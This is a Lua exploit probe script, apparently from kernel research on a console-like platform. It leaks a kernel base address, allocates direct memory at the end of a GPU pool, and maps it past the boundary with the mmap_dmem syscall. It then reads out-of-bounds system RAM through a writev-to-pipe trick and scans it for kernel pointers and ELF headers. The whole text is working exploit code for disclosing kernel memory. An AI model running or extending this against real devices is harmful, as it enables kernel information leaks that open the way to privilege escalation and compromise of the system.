-- CRASH_CLASS: MODERATE
-- PROBE 533g: Read content of pages past GPU pool boundary
--
-- 533f CONFIRMED: writev shows ALL pages 0-48 VALID, including 34 pages
-- past the pool boundary (0x150000000). The device pager extends the
-- mmap_dmem mapping into system RAM.
--
-- NOW: read actual content via pipe trick (writev to pipe, read from pipe)
-- to see what's in system RAM past the pool boundary.
-- Looking for: kernel pointers (0xFFFF8xxx), ELF headers (7F454C46),
-- or any non-zero data that proves we're reading system RAM.

print("=== PROBE 533g: READ PAST POOL ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return h, l
    end
    local n = to_num(v); if n < 0 then n = n + 0x100000000 end
    return 0, n
end

local function write_string(buf, s)
    for i = 1, #s, 4 do
        local b0 = string.byte(s, i) or 0
        local b1 = string.byte(s, i+1) or 0
        local b2 = string.byte(s, i+2) or 0
        local b3 = string.byte(s, i+3) or 0
        wd(buf + (i - 1), b0 + b1 * 256 + b2 * 65536 + b3 * 16777216)
    end
end

local sc_writev = make_syscall(121)
local sc_pipe2 = make_syscall(542)
local sc_read = make_syscall(3)
local sc_close = make_syscall(6)
local sc_628 = make_syscall(628)

local lk = uint64(0)
do
    local info = memory.alloc(0x200)
    zero(info, 0x200); wd(info, 0x160)
    pcall(function() make_syscall(593)(uint64(0x2001), info) end)
    lk = uint64(string.format("0x%X%08X", rd(info + 0x10C) or 0, rd(info + 0x108) or 0))
end
print("lk=" .. q(lk))
local alloc_fn = lk + uint64(0x17EF0)

-- Allocate at pool end
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64("0x14FFC0000"), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(phys_out))
end)
local phys = rq(phys_out)
local phys_n = to_num(phys)
print("phys=" .. q(phys))

local pool_end = 0x150000000
local pages_to_end = math.floor((pool_end - phys_n) / 0x4000)
print("pages_to_end=" .. pages_to_end)

-- Map with mmap_dmem(628)
local ok_m, map_va = pcall(function()
    return sc_628(uint64(0), uint64(0x4000), uint64(-1),
        uint64(3), uint64(0), phys)
end)
print("VA=" .. q(map_va))

-- Create pipe for reading content
local pbuf = memory.alloc(8)
zero(pbuf, 8)
pcall(function() sc_pipe2(uint64(pbuf), uint64(0)) end)
local pipe_r = rd(pbuf)
local pipe_w = rd(pbuf + 4)
print("pipe: r=" .. (pipe_r or "nil") .. " w=" .. (pipe_w or "nil"))

if not pipe_r or pipe_r <= 0 or not pipe_w or pipe_w <= 0 then
    print("ERROR: pipe failed")
    print("=== 533g DONE ===")
    return
end

-- Read first 64 bytes of each page near and past boundary
local iov = memory.alloc(16)
local page_size = 0x4000
local read_size = 64

print("")
print("[A] Reading pages (boundary at page " .. pages_to_end .. ")")

local nonzero_count = 0
local kptr_count = 0

-- Read pages from boundary-2 to boundary+48
local start_pg = math.max(0, pages_to_end - 2)
local end_pg = pages_to_end + 48

for pg = start_pg, end_pg do
    local test_addr = map_va + uint64(pg * page_size)

    -- Write from mapped VA into pipe
    wq(iov, test_addr)
    wq(iov + 8, uint64(read_size))
    local ok_wv, wrv = pcall(function()
        return sc_writev(uint64(pipe_w), uint64(iov), uint64(1))
    end)
    local wrvn = ok_wv and to_num(wrv) or -999

    if wrvn ~= read_size then
        -- Page not valid
        local phys_est = phys_n + pg * page_size
        local bm = phys_est >= pool_end and " PAST" or ""
        print(string.format("  pg %02d (0x%X)%s: INVALID (writev=%d)", pg, phys_est, bm, wrvn))
        -- 4 consecutive failures past boundary = stop
        if pg > pages_to_end + 4 and wrvn ~= read_size then
            print("  (stopping)")
            break
        end
    else
        -- Read from pipe
        local rbuf = memory.alloc(read_size)
        zero(rbuf, read_size)
        local ok_rd2, rrv = pcall(function()
            return sc_read(uint64(pipe_r), uint64(rbuf), uint64(read_size))
        end)
        local rrvn = ok_rd2 and to_num(rrv) or -999

        local phys_est = phys_n + pg * page_size
        local bm = phys_est >= pool_end and " PAST" or ""

        if rrvn ~= read_size then
            print(string.format("  pg %02d (0x%X)%s: writev OK but read=%d", pg, phys_est, bm, rrvn))
        else
            -- Print first 32 bytes as hex
            local hex = ""
            local all_zero = true
            for off = 0, 28, 4 do
                local d = rd(rbuf + off)
                if d then
                    if d < 0 then d = d + 0x100000000 end
                    if d ~= 0 then all_zero = false end
                    hex = hex .. string.format("%08X ", d)
                end
            end

            -- Check for kernel pointer in first 64 bytes
            local has_kptr = false
            for off = 0, read_size - 8, 8 do
                local v = rq(rbuf + off)
                if v then
                    local h, l = get_hi_lo(v)
                    if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                        has_kptr = true
                        kptr_count = kptr_count + 1
                    end
                end
            end

            -- Check ELF
            local d0 = rd(rbuf)
            local has_elf = d0 and (d0 == 0x464C457F or (d0 < 0 and d0 + 0x100000000 == 0x464C457F))

            local tag = ""
            if has_kptr then tag = " ***KPTR***" end
            if has_elf then tag = tag .. " ***ELF***" end
            if not all_zero then nonzero_count = nonzero_count + 1 end

            if all_zero then
                print(string.format("  pg %02d (0x%X)%s: ZERO", pg, phys_est, bm))
            else
                print(string.format("  pg %02d (0x%X)%s: %s%s", pg, phys_est, bm, hex, tag))
            end
        end
    end
end

pcall(function() sc_close(uint64(pipe_r)) end)
pcall(function() sc_close(uint64(pipe_w)) end)

print("")
print("nonzero_pages=" .. nonzero_count)
print("kernel_pointer_pages=" .. kptr_count)
print("=== 533g DONE ===")
